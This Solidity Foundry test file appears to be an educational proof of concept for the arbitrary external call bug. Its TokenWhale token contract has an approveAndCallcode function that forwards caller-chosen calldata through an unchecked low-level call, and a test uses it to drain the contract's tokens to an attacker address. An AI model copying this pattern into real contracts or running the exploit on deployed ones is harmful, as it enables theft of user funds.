// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract ContractTest is Test {
        TokenWhale TokenWhaleContract;

function testUnsafeCall() public {
 
    address alice = vm.addr(1);
    address bob = vm.addr(2);
    TokenWhaleContract = new TokenWhale();   
    TokenWhaleContract.TokenWhaleDeploy(address(TokenWhaleContract));
    console.log("TokenWhale balance:",TokenWhaleContract.balanceOf(address(TokenWhaleContract)));
  
   // bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000);
 
    console.log("Alice tries to perform unsafe call to transfer asset from TokenWhaleContract");
    vm.prank(alice);  
    TokenWhaleContract.approveAndCallcode(address(TokenWhaleContract),0,abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000));
    console.log("Exploit completed");
    console.log("TokenWhale balance:",TokenWhaleContract.balanceOf(address(TokenWhaleContract)));
    console.log("Alice balance:",TokenWhaleContract.balanceOf(address(alice)));
    }
  receive() payable external{}
}

contract TokenWhale {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function TokenWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
    /* Approves and then calls the contract code*/
    function approveAndCallcode(address _spender, uint256 _value, bytes memory _extraData) public returns (bool success) {
        allowance[msg.sender][_spender] = _value; 
 
        //Call the contract code
        _spender.call(_extraData);  //vulnerable point
       // return true;
    }
}

